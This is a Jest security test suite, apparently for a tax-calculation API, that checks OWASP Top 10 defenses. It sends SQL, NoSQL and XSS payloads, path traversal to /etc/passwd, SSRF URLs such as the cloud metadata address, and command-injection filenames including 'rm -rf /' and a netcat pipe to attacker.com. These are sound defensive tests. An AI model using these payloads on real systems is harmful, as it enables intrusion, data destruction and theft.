const axios = require('axios');
const cheerio = require('cheerio');

describe('OWASP Security Testing', () => {
  let authToken;
  const baseUrl = global.TEST_CONFIG.API_GATEWAY_URL;

  beforeAll(async () => {
    authToken = await global.authenticateTestUser();
  });

  describe('A01: Broken Access Control', () => {
    test('should prevent unauthorized access to user data', async () => {
      // Try to access another user's data without proper authorization
      try {
        await axios.get(`${baseUrl}/api/user/profile/9999`, {
          headers: global.createAuthHeaders(authToken)
        });
        fail('Should have been denied access');
      } catch (error) {
        expect([401, 403, 404]).toContain(error.response.status);
      }
    });

    test('should prevent privilege escalation', async () => {
      // Try to access admin endpoints with regular user token
      try {
        await axios.get(`${baseUrl}/api/admin/users`, {
          headers: global.createAuthHeaders(authToken)
        });
        fail('Should have been denied admin access');
      } catch (error) {
        expect([401, 403]).toContain(error.response.status);
      }
    });

    test('should prevent direct object reference attacks', async () => {
      const headers = global.createAuthHeaders(authToken);

      // Create a calculation
      const calcResponse = await axios.post(`${baseUrl}/api/calculations`,
        global.TEST_DATA.taxCalculation, { headers });
      const calculationId = calcResponse.data.calculationId;

      // Try to access calculation with modified ID
      const tamperedId = calculationId.replace(/\d/g, '9');

      try {
        await axios.get(`${baseUrl}/api/calculations/${tamperedId}`, { headers });
        // If it succeeds, ensure it's not returning someone else's data
      } catch (error) {
        expect([401, 403, 404]).toContain(error.response.status);
      }
    });

    test('should validate file access permissions', async () => {
      // Try to access files with manipulated file IDs
      const headers = global.createAuthHeaders(authToken);

      try {
        await axios.get(`${baseUrl}/api/files/../../etc/passwd`, { headers });
        fail('Should prevent path traversal');
      } catch (error) {
        expect([400, 404]).toContain(error.response.status);
      }
    });
  });

  describe('A02: Cryptographic Failures', () => {
    test('should use HTTPS in production', async () => {
      // Check if the service enforces HTTPS
      if (process.env.NODE_ENV === 'production') {
        try {
          await axios.get(baseUrl.replace('https', 'http') + '/health');
          fail('Should redirect HTTP to HTTPS in production');
        } catch (error) {
          // Should either fail or redirect to HTTPS
          expect(error.code === 'ECONNREFUSED' || error.response?.status === 301).toBe(true);
        }
      }
    });

    test('should not expose sensitive data in responses', async () => {
      const headers = global.createAuthHeaders(authToken);
      const response = await axios.get(`${baseUrl}/api/auth/me`, { headers });

      // User data should not contain password hash or other sensitive info
      expect(response.data.user).not.toHaveProperty('password');
      expect(response.data.user).not.toHaveProperty('passwordHash');
      expect(response.data.user).not.toHaveProperty('salt');
    });

    test('should use secure password storage', async () => {
      // Register a new user and verify password is not stored in plain text
      const testUser = global.generateTestData('user');

      const registerResponse = await axios.post(`${baseUrl}/api/auth/register`, testUser);

      if (registerResponse.status === 201) {
        // Response should not contain the plain password
        expect(JSON.stringify(registerResponse.data)).not.toContain(testUser.password);
      }
    });

    test('should implement proper session management', async () => {
      const headers = global.createAuthHeaders(authToken);
      const response = await axios.get(`${baseUrl}/api/auth/me`, { headers });

      // Should have secure session indicators
      expect(response.headers).toHaveProperty('x-content-type-options');
      expect(response.headers).toHaveProperty('x-frame-options');
    });
  });

  describe('A03: Injection Attacks', () => {
    test('should prevent SQL injection in login', async () => {
      const sqlInjectionPayloads = [
        "admin'--",
        "admin'/*",
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --"
      ];

      for (const payload of sqlInjectionPayloads) {
        try {
          await axios.post(`${baseUrl}/api/auth/login`, {
            email: payload,
            password: "anything"
          });
        } catch (error) {
          // Should reject malicious input
          expect(error.response.status).toBe(401);
          // Should not reveal database errors
          expect(error.response.data.error).not.toMatch(/sql|database|syntax/i);
        }
      }
    });

    test('should prevent NoSQL injection in search', async () => {
      const headers = global.createAuthHeaders(authToken);
      const noSqlPayloads = [
        { "$ne": null },
        { "$where": "function() { return true; }" },
        { "$regex": ".*" },
        { "$gt": "" }
      ];

      for (const payload of noSqlPayloads) {
        try {
          await axios.get(`${baseUrl}/api/calculations`, {
            headers,
            params: { filter: JSON.stringify(payload) }
          });
        } catch (error) {
          // Should handle malicious queries gracefully
          expect([400, 422]).toContain(error.response.status);
        }
      }
    });

    test('should prevent command injection in file processing', async () => {
      const headers = { ...global.createAuthHeaders(authToken) };
      delete headers['Content-Type'];

      // Try to inject commands via filename
      const maliciousFilenames = [
        'test; rm -rf /',
        'test && cat /etc/passwd',
        'test | nc attacker.com 4444',
        'test`rm /tmp/test`'
      ];

      for (const filename of maliciousFilenames) {
        try {
          const FormData = require('form-data');
          const formData = new FormData();
          formData.append('file', 'test content', { filename });
          formData.append('documentType', 'tax_data');

          await axios.post(`${baseUrl}/api/files/upload`, formData, {
            headers: { ...headers, ...formData.getHeaders() }
          });
        } catch (error) {
          // Should reject malicious filenames
          expect([400, 422]).toContain(error.response.status);
        }
      }
    });

    test('should prevent XSS in calculation descriptions', async () => {
      const headers = global.createAuthHeaders(authToken);
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src="x" onerror="alert(\'XSS\')">',
        '"><script>alert("XSS")</script>',
        '\'-alert("XSS")-\''
      ];

      for (const payload of xssPayloads) {
        try {
          const response = await axios.post(`${baseUrl}/api/calculations`, {
            ...global.TEST_DATA.taxCalculation,
            description: payload
          }, { headers });

          if (response.status === 201) {
            // If creation succeeds, check that XSS payload is properly escaped
            const retrieveResponse = await axios.get(
              `${baseUrl}/api/calculations/${response.data.calculationId}`,
              { headers }
            );

            const description = retrieveResponse.data.input.description;
            expect(description).not.toContain('<script>');
            expect(description).not.toContain('javascript:');
            expect(description).not.toContain('onerror=');
          }
        } catch (error) {
          // Should validate input and reject XSS attempts
          expect([400, 422]).toContain(error.response.status);
        }
      }
    });
  });

  describe('A04: Insecure Design', () => {
    test('should implement rate limiting', async () => {
      const headers = global.createAuthHeaders(authToken);

      // Make many rapid requests
      const requests = Array(100).fill().map(() =>
        axios.get(`${baseUrl}/api/calculations`, { headers })
      );

      const results = await Promise.allSettled(requests);
      const rateLimitedRequests = results.filter(
        r => r.status === 'rejected' && r.reason?.response?.status === 429
      );

      // Should have some rate-limited requests
      expect(rateLimitedRequests.length).toBeGreaterThan(0);
    });

    test('should validate business logic constraints', async () => {
      const headers = global.createAuthHeaders(authToken);

      // Try impossible tax scenarios
      const impossibleScenarios = [
        { income: -50000, country: 'US', filingStatus: 'single', year: 2023 },
        { income: 50000, country: 'XX', filingStatus: 'single', year: 2023 },
        { income: 50000, country: 'US', filingStatus: 'invalid', year: 2023 },
        { income: 50000, country: 'US', filingStatus: 'single', year: 1800 }
      ];

      for (const scenario of impossibleScenarios) {
        try {
          await axios.post(`${baseUrl}/api/calculations`, scenario, { headers });
          fail(`Should reject invalid scenario: ${JSON.stringify(scenario)}`);
        } catch (error) {
          expect([400, 422]).toContain(error.response.status);
        }
      }
    });

    test('should prevent workflow bypass', async () => {
      const headers = global.createAuthHeaders(authToken);

      // Try to generate report without calculation
      try {
        await axios.post(`${baseUrl}/api/reports/generate`, {
          calculationId: 'non-existent-id',
          format: 'pdf'
        }, { headers });
        fail('Should prevent report generation without valid calculation');
      } catch (error) {
        expect([400, 404]).toContain(error.response.status);
      }
    });
  });

  describe('A05: Security Misconfiguration', () => {
    test('should not expose sensitive server information', async () => {
      const response = await axios.get(`${baseUrl}/health`);

      // Should not expose server software versions
      expect(response.headers.server).not.toMatch(/apache|nginx|express/i);
      expect(response.headers['x-powered-by']).toBeUndefined();
    });

    test('should disable directory browsing', async () => {
      try {
        const response = await axios.get(`${baseUrl}/`);

        if (response.status === 200) {
          const $ = cheerio.load(response.data);
          const pageContent = $('body').text().toLowerCase();

          // Should not show directory listing
          expect(pageContent).not.toContain('index of');
          expect(pageContent).not.toContain('directory listing');
        }
      } catch (error) {
        // 404 or other error is fine
        expect([404, 403]).toContain(error.response.status);
      }
    });

    test('should set appropriate security headers', async () => {
      const response = await axios.get(`${baseUrl}/health`);

      // Check for security headers
      expect(response.headers).toHaveProperty('x-content-type-options', 'nosniff');
      expect(response.headers).toHaveProperty('x-frame-options');
      expect(response.headers).toHaveProperty('x-xss-protection');

      if (process.env.NODE_ENV === 'production') {
        expect(response.headers).toHaveProperty('strict-transport-security');
      }
    });

    test('should not expose debug information', async () => {
      // Try to trigger error responses
      try {
        await axios.get(`${baseUrl}/api/nonexistent`);
      } catch (error) {
        const errorResponse = error.response.data;

        // Should not expose stack traces or internal paths
        expect(JSON.stringify(errorResponse)).not.toMatch(/\/var\/www|\/home|\/usr|C:\\/);
        expect(JSON.stringify(errorResponse)).not.toContain('at ');
        expect(JSON.stringify(errorResponse)).not.toContain('node_modules');
      }
    });
  });

  describe('A06: Vulnerable and Outdated Components', () => {
    test('should not expose component version information', async () => {
      const response = await axios.get(`${baseUrl}/health`);

      // Check that versions are not exposed in headers
      expect(response.headers['x-powered-by']).toBeUndefined();
      expect(response.headers.server).not.toMatch(/\/[\d.]+/); // No version numbers
    });

    test('should handle malformed requests gracefully', async () => {
      // Send malformed JSON
      try {
        await axios.post(`${baseUrl}/api/calculations`, 'invalid json', {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${authToken}`
          }
        });
      } catch (error) {
        expect(error.response.status).toBe(400);
        // Should not expose parser details
        expect(error.response.data.error).not.toContain('JSON.parse');
      }
    });
  });

  describe('A07: Identification and Authentication Failures', () => {
    test('should enforce strong password policies', async () => {
      const weakPasswords = [
        '123456',
        'password',
        'qwerty',
        '12345678',
        'abc123',
        'password123'
      ];

      for (const weakPassword of weakPasswords) {
        const testUser = {
          ...global.generateTestData('user'),
          password: weakPassword
        };

        try {
          await axios.post(`${baseUrl}/api/auth/register`, testUser);
          fail(`Should reject weak password: ${weakPassword}`);
        } catch (error) {
          expect([400, 422]).toContain(error.response.status);
        }
      }
    });

    test('should implement account lockout after failed attempts', async () => {
      const testEmail = 'lockout-test@example.com';

      // Try multiple failed login attempts
      for (let i = 0; i < 10; i++) {
        try {
          await axios.post(`${baseUrl}/api/auth/login`, {
            email: testEmail,
            password: 'wrongpassword'
          });
        } catch (error) {
          expect(error.response.status).toBe(401);
        }
      }

      // Account should be locked after multiple failures
      try {
        await axios.post(`${baseUrl}/api/auth/login`, {
          email: testEmail,
          password: 'wrongpassword'
        });
      } catch (error) {
        // Should indicate account is locked or still return 401
        expect([401, 423]).toContain(error.response.status);
      }
    });

    test('should expire sessions appropriately', async () => {
      // This would need to be tested with a very short token expiry
      // For now, just verify that tokens have expiry claims
      const jwt = require('jsonwebtoken');

      try {
        const decoded = jwt.decode(authToken, { complete: true });
        expect(decoded.payload).toHaveProperty('exp');
        expect(decoded.payload).toHaveProperty('iat');

        // Token should expire in reasonable time (not too long)
        const expiryTime = decoded.payload.exp * 1000;
        const issuedTime = decoded.payload.iat * 1000;
        const tokenLifetime = expiryTime - issuedTime;

        // Should not be more than 24 hours
        expect(tokenLifetime).toBeLessThanOrEqual(24 * 60 * 60 * 1000);
      } catch (error) {
        // If token is not JWT, that's also acceptable
        console.log('Token is not JWT format');
      }
    });

    test('should prevent session fixation', async () => {
      // Login and get token
      const loginResponse = await axios.post(`${baseUrl}/api/auth/login`, {
        email: global.TEST_CONFIG.TEST_USER.email,
        password: global.TEST_CONFIG.TEST_USER.password
      });

      const token1 = loginResponse.data.token;

      // Login again - should get different token
      const loginResponse2 = await axios.post(`${baseUrl}/api/auth/login`, {
        email: global.TEST_CONFIG.TEST_USER.email,
        password: global.TEST_CONFIG.TEST_USER.password
      });

      const token2 = loginResponse2.data.token;

      // Tokens should be different (preventing session fixation)
      expect(token1).not.toBe(token2);
    });
  });

  describe('A08: Software and Data Integrity Failures', () => {
    test('should validate file uploads integrity', async () => {
      const headers = { ...global.createAuthHeaders(authToken) };
      delete headers['Content-Type'];

      // Try to upload suspicious file types
      const suspiciousFiles = [
        { content: '<?php echo "test"; ?>', filename: 'test.php' },
        { content: '<script>alert("xss")</script>', filename: 'test.html' },
        { content: 'MZ\x90\x00', filename: 'test.exe' } // PE header
      ];

      for (const file of suspiciousFiles) {
        try {
          const FormData = require('form-data');
          const formData = new FormData();
          formData.append('file', file.content, { filename: file.filename });
          formData.append('documentType', 'tax_data');

          await axios.post(`${baseUrl}/api/files/upload`, formData, {
            headers: { ...headers, ...formData.getHeaders() }
          });
          fail(`Should reject suspicious file: ${file.filename}`);
        } catch (error) {
          expect([400, 415, 422]).toContain(error.response.status);
        }
      }
    });

    test('should verify data consistency in calculations', async () => {
      const headers = global.createAuthHeaders(authToken);

      // Create calculation
      const calcResponse = await axios.post(`${baseUrl}/api/calculations`,
        global.TEST_DATA.taxCalculation, { headers });

      expect(calcResponse.status).toBe(201);

      // Retrieve calculation and verify data integrity
      const retrieveResponse = await axios.get(
        `${baseUrl}/api/calculations/${calcResponse.data.calculationId}`,
        { headers }
      );

      expect(retrieveResponse.status).toBe(200);
      expect(retrieveResponse.data.input.income).toBe(global.TEST_DATA.taxCalculation.income);
      expect(retrieveResponse.data.result.totalTax).toBeGreaterThanOrEqual(0);
    });
  });

  describe('A09: Security Logging and Monitoring Failures', () => {
    test('should log authentication attempts', async () => {
      // Make failed login attempt
      try {
        await axios.post(`${baseUrl}/api/auth/login`, {
          email: 'nonexistent@example.com',
          password: 'wrongpassword'
        });
      } catch (error) {
        expect(error.response.status).toBe(401);
      }

      // Successful login
      await axios.post(`${baseUrl}/api/auth/login`, {
        email: global.TEST_CONFIG.TEST_USER.email,
        password: global.TEST_CONFIG.TEST_USER.password
      });

      // These events should be logged (checked via monitoring endpoints if available)
    });

    test('should provide audit trail for sensitive operations', async () => {
      const headers = global.createAuthHeaders(authToken);

      // Create calculation (sensitive operation)
      const calcResponse = await axios.post(`${baseUrl}/api/calculations`,
        global.TEST_DATA.taxCalculation, { headers });

      // Check if there's an audit endpoint
      try {
        const auditResponse = await axios.get(`${baseUrl}/api/audit/calculations`, { headers });

        if (auditResponse.status === 200) {
          // Should contain recent calculation creation
          expect(auditResponse.data).toHaveProperty('events');
          expect(Array.isArray(auditResponse.data.events)).toBe(true);
        }
      } catch (error) {
        // Audit endpoint might not exist or be accessible to users
        console.log('Audit endpoint not accessible to regular users');
      }
    });
  });

  describe('A10: Server-Side Request Forgery (SSRF)', () => {
    test('should prevent SSRF in webhook endpoints', async () => {
      const headers = global.createAuthHeaders(authToken);
      const maliciousUrls = [
        'http://localhost:22',
        'http://127.0.0.1:6379',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd',
        'ftp://internal.server.com/'
      ];

      for (const url of maliciousUrls) {
        try {
          await axios.post(`${baseUrl}/api/webhooks/test`, {
            url: url
          }, { headers });
          fail(`Should prevent SSRF to: ${url}`);
        } catch (error) {
          expect([400, 403, 422]).toContain(error.response.status);
        }
      }
    });

    test('should validate external service URLs', async () => {
      const headers = global.createAuthHeaders(authToken);

      // Try to make service fetch internal resources
      try {
        await axios.post(`${baseUrl}/api/external/fetch`, {
          service: 'currency_exchange',
          url: 'http://localhost:3306'
        }, { headers });
        fail('Should prevent fetching from internal services');
      } catch (error) {
        expect([400, 403, 422]).toContain(error.response.status);
      }
    });
  });

  describe('Additional Security Tests', () => {
    test('should prevent clickjacking', async () => {
      const response = await axios.get(`${baseUrl}/health`);

      expect(response.headers).toHaveProperty('x-frame-options');
      const frameOptions = response.headers['x-frame-options'];
      expect(['DENY', 'SAMEORIGIN']).toContain(frameOptions.toUpperCase());
    });

    test('should implement CSRF protection', async () => {
      // State-changing operations should require CSRF protection
      const headers = global.createAuthHeaders(authToken);

      try {
        await axios.post(`${baseUrl}/api/calculations`,
          global.TEST_DATA.taxCalculation,
          {
            headers: {
              ...headers,
              'Origin': 'https://malicious-site.com'
            }
          }
        );
      } catch (error) {
        // Should either succeed (if CSRF token provided) or fail with 403
        if (error.response.status === 403) {
          expect(error.response.data.error).toMatch(/csrf|cross.site|origin/i);
        }
      }
    });

    test('should sanitize error messages', async () => {
      // Try to trigger various error conditions
      const errorTests = [
        () => axios.get(`${baseUrl}/api/calculations/invalid-id`, {
          headers: global.createAuthHeaders(authToken)
        }),
        () => axios.post(`${baseUrl}/api/calculations`, { invalid: 'data' }, {
          headers: global.createAuthHeaders(authToken)
        }),
        () => axios.get(`${baseUrl}/api/nonexistent`)
      ];

      for (const errorTest of errorTests) {
        try {
          await errorTest();
        } catch (error) {
          const errorMessage = JSON.stringify(error.response.data);

          // Should not expose internal information
          expect(errorMessage).not.toMatch(/stack|trace/i);
          expect(errorMessage).not.toContain('node_modules');
          expect(errorMessage).not.toMatch(/\/var\/|\/home\/|C:\\/);
          expect(errorMessage).not.toContain('password');
          expect(errorMessage).not.toContain('secret');
        }
      }
    });

    test('should validate content types', async () => {
      const headers = global.createAuthHeaders(authToken);

      // Try to send data with wrong content type
      try {
        await axios.post(`${baseUrl}/api/calculations`,
          global.TEST_DATA.taxCalculation,
          {
            headers: {
              ...headers,
              'Content-Type': 'text/plain'
            }
          }
        );
      } catch (error) {
        expect([400, 415]).toContain(error.response.status);
      }
    });
  });
});